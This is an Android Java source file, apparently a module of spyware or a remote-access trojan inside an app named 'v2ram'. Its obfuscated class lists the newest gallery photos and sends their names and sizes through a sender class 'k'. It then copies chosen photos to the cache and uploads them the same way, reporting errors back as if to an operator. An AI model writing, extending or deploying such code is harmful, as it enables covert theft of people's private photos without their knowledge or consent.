package com.v2ram;

import android.content.Context;
import android.database.Cursor;
import android.provider.MediaStore;

public class l {
    public static void photos(Context c, int limit) {
        Cursor cur = c.getContentResolver().query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            new String[]{MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE},
            null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT " + limit);
        if (cur == null) { k.send("gallery: no access"); return; }
        StringBuilder sb = new StringBuilder();
        while (cur.moveToNext()) {
            sb.append(cur.getLong(0)).append(" | ")
              .append(cur.getString(1)).append(" | ")
              .append(cur.getLong(2)).append("b\n");
        }
        cur.close();
        k.send(sb.toString());
    }

    public static void getPhoto(Context c, long id) {
        try {
            android.net.Uri u = android.content.ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
            java.io.InputStream in = c.getContentResolver().openInputStream(u);
            java.io.File f = new java.io.File(c.getCacheDir(), "p_" + id + ".jpg");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
            byte[] b = new byte[8192];
            int n;
            while ((n = in.read(b)) > 0) fo.write(b, 0, n);
            in.close(); fo.close();
            k.sendFile(f, "photo_" + id + ".jpg");
        } catch (Throwable t) { k.send("photo err: " + t.getMessage()); }
    }
}